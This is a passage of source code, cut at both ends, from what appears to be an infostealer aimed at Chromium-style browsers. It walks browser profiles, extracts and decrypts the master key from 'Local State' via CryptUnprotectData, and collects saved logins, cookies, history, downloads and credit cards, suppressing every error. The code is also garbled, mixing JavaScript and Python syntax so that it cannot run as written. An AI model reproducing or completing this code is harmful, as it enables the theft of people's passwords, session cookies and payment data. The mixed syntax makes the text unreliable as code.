      'Profile 1',
      'Profile 2',
      'Profile 3',
      'Profile 4',
      'Profile 5',
    ];

    for (const [key, path] of this.browsers.items()) {
      if (!os.path.exists(path)) {
        continue;
      }

      this.master_key = this.getMasterKey(f'{path}\\Local State');
      if (!this.master_key) {
        continue;
      }

      for (const profile of this.profiles) {
        if (!os.path.exists(path + '\\' + profile)) {
          continue;
        }

        const operations = [
          this.getLoginData,
          this.getCookies,
          this.getWebHistory,
          this.getDownloads,
          this.getCreditCards,
        ];

        for (const operation of operations) {
          try {
            operation(path, profile);
          } catch (e) {
            // print(e);
          }
        }
      }
    }
  }

  getMasterKey(path) {
    if (!os.path.exists(path)) {
      return;
    }

    if ('os_crypt' in open(path, 'r', encoding='utf-8').read()) {
      return;
    }

    const c = open(path, 'r', encoding='utf-8').read();
    const local_state = json.loads(c);

    const master_key = base64.b64decode(local_state['os_crypt']['encrypted_key']);
    const master_key = master_key[5:];
    const master_key = CryptUnprotectData(master_key, None, None, None, 0)[1];
